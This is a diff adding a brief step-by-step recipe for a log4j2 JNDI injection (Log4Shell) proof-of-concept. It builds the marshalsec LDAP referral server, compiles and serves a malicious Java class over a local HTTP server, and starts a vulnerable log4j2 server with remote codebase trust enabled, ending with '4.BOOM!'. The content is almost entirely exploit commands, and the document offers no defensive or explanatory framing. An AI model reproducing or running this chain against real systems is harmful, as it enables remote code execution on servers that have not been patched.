@@ -1,0 +1,11 @@
+1.marshalsec (ldap server)
+git clone https://github.com/mbechler/marshalsec.git & cd marshalsec & mvn package -Dmaven.test.skip=true
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://localhost:9001/#Demo" 9999
+
+2.bad_class (affect online server when running it's code)
+cd bad_class & javac Demo.java & python -m http.server 9001
+
+3.online server using log4j2 (inject jndi)
+cd server & mvn package & java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar target/server-1.0.jar com.xy.server.Server
+
+4.BOOM!
